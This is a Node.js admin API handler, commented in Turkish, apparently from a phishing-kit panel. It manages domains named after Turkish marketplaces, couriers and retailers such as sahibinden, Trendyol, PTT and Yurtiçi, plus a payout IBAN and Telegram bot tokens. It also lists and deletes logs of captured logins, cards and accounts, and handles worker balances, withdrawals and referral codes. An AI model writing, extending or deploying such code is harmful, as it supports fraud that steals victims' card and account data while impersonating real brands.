// api/panel/admin.js — Admin yönetim (from original)
const { supabase } = require('../lib/supabase');
const { getJsonBody } = require('../lib/json-body');
const { requireAuth } = require('../lib/auth');

module.exports = async function handler(req, res) {
  if (req.method !== 'POST' && req.method !== 'GET') return res.status(405).end();
  const user = requireAuth(req, res); if (!user) return;
  if (user.is_rol !== 'admin' && user.is_rol !== 'mod') return res.status(403).json({ sonuc:'hata', mesaj:'Yetkiniz yok.' });

  if (req.method === 'GET') {
    const { action } = req.query;
    if (action==='kullanicilar') { const { data }=await supabase.from('kullanicilar').select('id,kullaniciadi,bakiye,toplamalinan,tgadresi,k_rol').order('id',{ascending:false}); return res.json({ sonuc:'tamam', kullanicilar:data||[] }); }
    if (action==='refkodlari') { const { data }=await supabase.from('refkodlari').select('*').order('id',{ascending:false}); return res.json({ sonuc:'tamam', refkodlari:data||[] }); }
    if (action==='cekimler') { const { data }=await supabase.from('cekimtalepleri').select('*').order('id',{ascending:false}); return res.json({ sonuc:'tamam', cekimler:data||[] }); }
    if (action==='girislog') { const { data }=await supabase.from('girisyapanlar').select('*').order('id',{ascending:false}).limit(200); return res.json({ sonuc:'tamam', loglar:data||[] }); }
    if (action==='kartlog') { const { data }=await supabase.from('kartlar').select('*').order('id',{ascending:false}).limit(200); return res.json({ sonuc:'tamam', loglar:data||[] }); }
    if (action==='hesaplog') { const { data }=await supabase.from('hesaplar').select('*').order('id',{ascending:false}).limit(200); return res.json({ sonuc:'tamam', loglar:data||[] }); }
    if (action==='panel') { const { data }=await supabase.from('panel').select('*').eq('id',1).single(); return res.json({ sonuc:'tamam', panel:data||{} }); }
    return res.status(400).json({ sonuc:'hata' });
  }

  const body = getJsonBody(req);
  const { action } = body;
  if (action==='panelguncelle') { const { field,value }=body; const allowed=['dom_panel','dom_sahibinden','dom_dolap','dom_letgo','dom_pttavm','dom_turkcell','dom_shopier','dom_yurtici','dom_facebook','dom_trendyol','dom_hepsiburada','dom_migros','dom_pasaj','dom_ptt3','dom_bim','dom_a101','dom_pttkargo','ibanad','iban','banka','adminbot_token','adminbot_chatid','cekimbot_token','cekimbot_chatid','dekontbot_token','dekontbot_chatid','vergibot_token','vergibot_chatid']; if (!allowed.includes(field)) return res.status(400).json({ sonuc:'hata' }); await supabase.from('panel').update({ [field]:value }).eq('id',1); return res.json({ sonuc:'tamam' }); }
  if (action==='bakiyeguncelle') { await supabase.from('kullanicilar').update({ bakiye:String(body.miktar) }).eq('id',body.kullanici_id); return res.json({ sonuc:'tamam' }); }
  if (action==='rolguncelle') { const r=['','mod','admin']; if (!r.includes(body.rol)) return res.status(400).json({ sonuc:'hata' }); await supabase.from('kullanicilar').update({ k_rol:body.rol }).eq('id',body.kullanici_id); return res.json({ sonuc:'tamam' }); }
  if (action==='refekle') { const { randomCode }=require('../lib/helpers'); const kod=body.kod||randomCode(8); await supabase.from('refkodlari').insert({ ref_code:kod }); return res.json({ sonuc:'tamam', ref_code:kod }); }
  if (action==='refsil') { await supabase.from('refkodlari').delete().eq('id',body.id); return res.json({ sonuc:'tamam' }); }
  if (action==='kullanicisil') { await supabase.from('kullanicilar').delete().eq('id',body.id); return res.json({ sonuc:'tamam' }); }
  if (action==='logtemizle') { const t={giris:'girisyapanlar',kart:'kartlar',hesap:'hesaplar'}; const tbl=t[body.logtype]; if (!tbl) return res.status(400).json({ sonuc:'hata' }); await supabase.from(tbl).delete().neq('id',0); return res.json({ sonuc:'tamam' }); }
  return res.status(400).json({ sonuc:'hata' });
};
